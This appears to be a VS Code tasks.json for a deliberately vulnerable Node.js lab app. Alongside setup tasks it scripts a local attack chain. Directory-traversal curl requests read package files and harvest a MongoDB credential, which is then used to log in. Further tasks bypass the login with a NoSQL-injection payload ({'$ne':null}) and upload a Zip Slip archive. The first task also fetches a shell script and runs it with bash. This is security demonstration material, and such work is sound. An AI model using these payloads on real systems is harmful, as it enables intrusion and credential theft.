{
    // See https://go.microsoft.com/fwlink/?LinkId=733558
    // for the documentation about the tasks.json format
    "version": "2.0.0",
    "tasks": [
        {
            "label": "PRE-001 Install Snyk Studio Tools",
            "type": "shell",
            "command": "curl -fsSL 'https://raw.githubusercontent.com/snyk/studio-recipes/main/installer/dist/snyk-studio-install.sh' -o snyk-studio-install.sh;bash ./snyk-studio-install.sh"
        },
        {
            "label": "PRE-002 Drop Flag",
            "type":"shell",
            "command":"cd /workspaces; echo 'Directory Traversal Flag found' > flag.txt;"
        },
        {
            "label": "PRE-003 Run MongoDB",
            "type": "shell",
            "command": "docker ps --filter \"publish=27017\" --format \"{{.ID}}\" | grep -q . || docker run --rm -d -p 27017:27017 mongo:3"
        },
        {
            "label": "PRE-004 Install dependencies",
            "type": "shell",
            "command": "npm install",
            "dependsOn": ["PRE-003 Run MongoDB"]
        },
        {
            "label": "PRE-005 Start App",
            "type": "shell",
            "command": "npm install && npm start",
            "dependsOn": ["PRE-003 Run MongoDB"]
        },
        {
            "label": "DT-001 Get adm-zip version",
            "type": "shell",
            "command": "curl http://localhost:3001/public/%2e%2e/package-lock.json | jq '.dependencies[\"adm-zip\"]'"
        },
        {
            "label": "DT-002a Try /login with incorrect password",
            "type": "shell",
            "command": "curl -o /dev/null -s -w \"HTTP Status: %{http_code}\\n\" -X POST http://localhost:3001/login -H \"Content-Type: application/json\" -d '{\"username\":\"admin@snyk.io\",\"password\":\"wrong\"}'"
        },
        {
            "label": "DT-002b Discover Mongo creds",
            "type": "shell",
            "command": "curl http://localhost:3001/public/%2e%2e/mongoose-db.js | grep -E \"(mongoUri|username.*password)\""
        },
        {
            "label": "DT-002c Try /login with harvested password",
            "type": "shell",
            "command": "curl -o /dev/null -s -w \"HTTP Status: %{http_code}\\n\" -X POST http://localhost:3001/login -H \"Content-Type: application/json\" -d '{\"username\":\"admin@snyk.io\",\"password\":\"SuperSecretPassword\"}'"
        },
        {
            "label": "DT-003a Harvest routes/index.js",
            "type": "shell",
            "command": "curl http://localhost:3001/public/%2e%2e/routes/index.js"
        },
        {
            "label": "DT-003b NoSQL injection login bypass",
            "type": "shell",
            "command": "curl -s -w \"\\nHTTP Status: %{http_code}\\n\" -X POST http://localhost:3001/login -H \"Content-Type: application/json\" -d '{\"username\":\"admin@snyk.io\",\"password\":{\"$ne\":null}}'"
        },
        {
            "label": "ZS-001 Zip Slip Exploit",
            "type": "shell",
            "command": "curl -X POST http://localhost:3001/import -F 'importFile=@/workspaces/node-gva/exploits/demo/01-adm-zip-slip/malicious_workspace.zip'"
        }
    ]
}